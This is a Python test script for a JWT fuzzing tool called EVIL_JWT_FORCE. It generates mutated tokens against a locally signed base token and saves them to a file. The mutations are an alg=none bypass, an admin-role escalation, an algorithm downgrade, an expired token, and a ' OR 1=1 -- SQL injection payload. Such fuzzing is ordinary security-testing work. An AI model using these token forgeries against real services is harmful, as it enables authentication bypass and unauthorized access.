#!/usr/bin/env python3
"""
EVIL_JWT_FORCE - JWT Fuzzer Test Script
This script tests the JWT fuzzing functionality.
"""

import os
import sys
import json
import base64
from datetime import datetime
from modules.jwt_utils_simple import generate_token, decode_jwt, extract_parts

def base64url_encode(data):
    """Base64url encode without padding"""
    if isinstance(data, str):
        data = data.encode('utf-8')
    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')

def create_mutated_tokens(base_token):
    """Create various mutated JWT tokens for testing"""
    # Extract parts
    parts = extract_parts(base_token)
    if not parts:
        print("Error: Invalid base token")
        return []
    
    header = parts["header"]
    payload = parts["payload"]
    
    tokens = []
    
    # Test 1: Alg=none attack
    none_header = header.copy()
    none_header["alg"] = "none"
    none_header_b64 = base64url_encode(json.dumps(none_header))
    payload_b64 = base64url_encode(json.dumps(payload))
    tokens.append({
        "name": "alg=none attack",
        "token": f"{none_header_b64}.{payload_b64}.",
        "description": "JWT with algorithm set to 'none'"
    })
    
    # Test 2: Admin privilege escalation
    admin_payload = payload.copy()
    admin_payload["admin"] = True
    admin_payload["role"] = "admin"
    admin_payload_b64 = base64url_encode(json.dumps(admin_payload))
    tokens.append({
        "name": "admin privilege escalation",
        "token": f"{base64url_encode(json.dumps(header))}.{admin_payload_b64}.invalid-signature",
        "description": "JWT with admin privileges and invalid signature"
    })
    
    # Test 3: Expired token
    exp_payload = payload.copy()
    exp_payload["exp"] = 1516239022  # Expired timestamp
    exp_token = generate_token(exp_payload, "test_secret")
    tokens.append({
        "name": "expired token",
        "token": exp_token,
        "description": "JWT with an expired timestamp"
    })
    
    # Test 4: Token with SQL injection in payload
    sql_payload = payload.copy()
    sql_payload["name"] = "' OR 1=1 --"
    sql_token = generate_token(sql_payload, "test_secret")
    tokens.append({
        "name": "SQL injection",
        "token": sql_token,
        "description": "JWT with SQL injection payload"
    })
    
    # Test 5: Modified header with weaker algorithm
    weak_header = header.copy()
    weak_header["alg"] = "HS256"  # Downgrade from potential RS256
    weak_header_b64 = base64url_encode(json.dumps(weak_header))
    tokens.append({
        "name": "algorithm downgrade",
        "token": f"{weak_header_b64}.{payload_b64}.invalid-signature",
        "description": "JWT with downgraded algorithm"
    })
    
    return tokens

def main():
    """Main test function"""
    print("=== EVIL_JWT_FORCE - JWT Fuzzer Test ===")
    
    # Make sure output directory exists
    os.makedirs("output", exist_ok=True)
    
    # Generate a valid token as base
    payload = {
        "sub": "1234567890",
        "name": "Test User",
        "iat": int(datetime.now().timestamp()),
        "exp": int(datetime.now().timestamp()) + 3600  # Valid for 1 hour
    }
    
    base_token = generate_token(payload, "test_secret")
    print(f"\nBase token generated: {base_token}")
    print(f"Decoded payload: {json.dumps(decode_jwt(base_token), indent=2)}")
    
    # Create mutated tokens
    mutated_tokens = create_mutated_tokens(base_token)
    
    # Print and save the mutated tokens
    print(f"\nGenerated {len(mutated_tokens)} mutated tokens:")
    
    results = {
        "base_token": base_token,
        "mutated_tokens": []
    }
    
    for i, token_info in enumerate(mutated_tokens, 1):
        print(f"\n{i}. {token_info['name']}:")
        print(f"   {token_info['description']}")
        print(f"   Token: {token_info['token']}")
        
        # Try to decode the token
        try:
            decoded = decode_jwt(token_info['token'])
            print(f"   Decoded (without verification): {json.dumps(decoded, indent=2)}")
        except Exception as e:
            print(f"   Decode error: {e}")
        
        results["mutated_tokens"].append({
            "name": token_info["name"],
            "description": token_info["description"],
            "token": token_info["token"]
        })
    
    # Save to output file
    output_file = "output/jwt_fuzz_test.json"
    with open(output_file, "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2)
    
    print(f"\nTest results saved to: {output_file}")
    return 0

if __name__ == "__main__":
    sys.exit(main()) 